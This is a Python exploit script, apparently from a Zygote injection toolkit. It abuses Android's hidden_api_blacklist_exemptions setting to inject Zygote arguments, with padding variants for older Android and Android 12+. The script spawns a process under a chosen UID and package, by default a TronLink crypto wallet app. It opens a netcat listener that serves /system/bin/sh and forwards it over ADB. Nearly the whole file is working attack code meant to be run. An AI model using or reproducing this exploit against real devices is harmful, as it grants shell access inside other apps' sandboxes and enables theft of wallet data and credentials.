import argparse
import shlex
import subprocess
import time

from zygote_injection_toolkit.stage1 import Stage1Session


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Reference helper for app-targeted Zygote injection"
    )
    parser.add_argument("--package-name", default="com.tronlinkpro.wallet")
    parser.add_argument("--uid", type=int, required=True)
    parser.add_argument("--gid", type=int, required=True)
    parser.add_argument("--groups", default="3003")
    parser.add_argument("--port", type=int, default=1234)
    return parser


def run_custom_injection(
    package_name: str, uid: int, gid: int, groups: str, port: int
) -> bool:
    session = Stage1Session()
    delivery_mode = session.delivery_mode()
    netcat_command = session.find_netcat_command()
    parsed_netcat_command = shlex.join(netcat_command)

    # Use localhost on-device and forward it over ADB from the host.
    inner_command = (
        f"(settings delete global hidden_api_blacklist_exemptions;"
        f"{parsed_netcat_command} -s 127.0.0.1 -p {port} -L /system/bin/sh)&"
    )

    raw_zygote_arguments = [
        f"--setuid={uid}",
        f"--setgid={gid}",
        f"--setgroups={groups}",
        "--runtime-args",
        f"--app-data-dir=/data/user/0/{package_name}",
        f"--package-name={package_name}",
        "--seinfo=default:targetSdkVersion=30:complete",
        "--runtime-flags=1",
        "--target-sdk-version=30",
        "--is-top-app",
        f"--nice-name=recovery_{package_name}",
        "--invoke-with",
        f"{inner_command}#",
    ]

    zygote_arguments = "\n".join(
        [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments
    )

    if delivery_mode == "old":
        payload_value = f"LClass1;->method1(\n{zygote_arguments}"
    else:
        # delivery_mode == "new" (Android 12+)
        payload_value = "\n" * 3000 + "A" * 5157
        payload_value += zygote_arguments
        payload_value += "," + ",\n" * 1400

    print(f"Injecting payload for UID {uid} and package {package_name}...")

    session.shell_execute(
        ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
    )
    session.shell_execute(
        ["settings", "put", "global", "hidden_api_blacklist_exemptions", payload_value]
    )

    session.shell_execute(["am", "force-stop", "com.android.settings"])
    time.sleep(0.2)
    session.shell_execute(["am", "start", "-n", session.SETTINGS_COMPONENT])

    print("Injection sent. Waiting for listener...")

    try:
        for i in range(20):
            if session.is_port_open(port):
                print("Listener is UP!")
                subprocess.run(
                    ["adb", "forward", f"tcp:{port}", f"tcp:{port}"], check=True
                )
                return True
            time.sleep(1)

        print("Failed to detect listener.")
        return False
    finally:
        # CRITICAL: Always clean up the setting to prevent boot loop
        print("Cleaning up hidden_api_blacklist_exemptions setting...")
        try:
            session.shell_execute(
                ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
            )
            print("Cleanup completed.")
        except Exception as e:
            print(f"WARNING: Failed to clean up setting: {e}")
            print("If the device enters a boot loop, run:")
            print(
                "  adb wait-for-device && adb shell 'settings delete global hidden_api_blacklist_exemptions'"
            )


if __name__ == "__main__":
    args = build_parser().parse_args()
    raise SystemExit(
        0
        if run_custom_injection(
            package_name=args.package_name,
            uid=args.uid,
            gid=args.gid,
            groups=args.groups,
            port=args.port,
        )
        else 1
    )
